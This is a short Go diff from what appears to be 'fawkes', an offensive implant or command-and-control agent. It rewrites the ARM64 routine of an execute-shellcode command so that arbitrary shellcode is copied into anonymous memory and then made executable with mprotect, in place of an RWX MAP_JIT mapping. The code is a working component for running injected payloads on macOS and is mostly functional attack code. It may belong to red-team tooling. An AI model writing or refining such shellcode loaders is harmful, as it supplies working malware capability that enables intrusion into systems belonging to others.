@@ -12,8 +12,6 @@ import (
 	"fawkes/pkg/structs"
 )
 
-const mapJIT = 0x0800
-
 type ExecuteShellcodeCommand struct{}
 
 func (c *ExecuteShellcodeCommand) Name() string {
@@ -73,23 +71,23 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 }
 
 func allocShellcodeARM64(shellcode []byte, allocSize int) (uintptr, string, error) {
-	addr, _, errno := syscall.Syscall6(
-		syscall.SYS_MMAP,
-		0,
-		uintptr(allocSize),
-		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
-		syscall.MAP_PRIVATE|syscall.MAP_ANON|mapJIT,
-		^uintptr(0),
-		0,
-	)
-	if errno != 0 {
-		return 0, "", fmt.Errorf("mmap MAP_JIT failed: %w", errno)
+	data, err := syscall.Mmap(-1, 0, allocSize,
+		syscall.PROT_READ|syscall.PROT_WRITE,
+		syscall.MAP_PRIVATE|syscall.MAP_ANON)
+	if err != nil {
+		return 0, "", fmt.Errorf("mmap RW failed: %w", err)
 	}
 
-	//nolint:govet // mmap'd address from syscall is stable
-	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)
+	copy(data, shellcode)
 
-	return addr, "MAP_JIT (ARM64)", nil
+	err = syscall.Mprotect(data, syscall.PROT_READ|syscall.PROT_EXEC)
+	if err != nil {
+		_ = syscall.Munmap(data)
+		return 0, "", fmt.Errorf("mprotect RX failed (may need com.apple.security.cs.allow-jit entitlement): %w", err)
+	}
+
+	addr := uintptr(unsafe.Pointer(&data[0]))
+	return addr, "mmap RW + mprotect RX (ARM64)", nil
 }
 
 func allocShellcodeX86(shellcode []byte, allocSize int) (uintptr, string, error) {
